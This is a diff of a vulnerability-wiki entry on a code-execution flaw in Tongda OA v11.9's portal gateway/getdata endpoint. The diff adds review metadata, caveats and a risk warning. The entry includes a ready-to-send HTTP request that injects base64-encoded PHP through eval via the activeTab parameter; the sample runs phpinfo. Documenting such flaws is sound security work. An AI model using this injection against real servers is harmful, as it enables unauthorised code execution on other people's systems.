@@ -1,11 +1,50 @@
 ---
-version: "通达OA v11.9"
 source: "MrWQ/vulnerability-paper"
+title: "通达OA portal gateway/getdata activeTab代码执行"
+product: "通达OA"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "11.9；build/修复缺失"
+prerequisites: "有Cookie，最低权限未明"
+side_effects: "命令/代码执行示例可能改变主机状态"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/H7LjdR8RXU6Hp5Hen01weQ"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BE%20OA%20v11.9%20getdata%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
+category_recommendation: "OA / 通达"
+id: "vw-a4af48f1ed8dd734d954d43b"
+entity_id: "ve-a4af48f1ed8dd734d954d43b"
+schema_version: "1"
 ---
 
-# 通达 OA v11.9 getdata 任意命令执行漏洞
+# 通达OA portal gateway/getdata activeTab代码执行
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：通达OA；portal gateway/getdata activeTab代码执行
+- 版本、配置及部署条件：11.9；build/修复缺失
+- 认证与权限前提：有Cookie，最低权限未明
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- phpinfo只证明PHP代码能力，不直接证明OS命令
+- 缺根因、module/id对象前提、修复版本
+- 截图被攻陷状态不代表所有版本能力
+
+## 操作风险
+
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/H7LjdR8RXU6Hp5Hen01weQ)
 
 **漏洞说明**
@@ -32,7 +71,7 @@ payload：
 
 ```
 
-```
+```http
 GET /general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22cGhwaW5mbygpOw==%22)))%3B/*&id=19&module=Carouselimage HTTP/1.1
 Host: ip:port
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
@@ -40,7 +79,7 @@ Accept: */*
 Referer: http://ip:port/
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
-Cookie: PHPSESSID=omcivrbku8nr1oersk7gp4it17; KEY_RANDOMDATA=2220
+Cookie: PHPSESSID=o************************7; KEY_RANDOMDATA=2220
 Connection: close
 
 ```
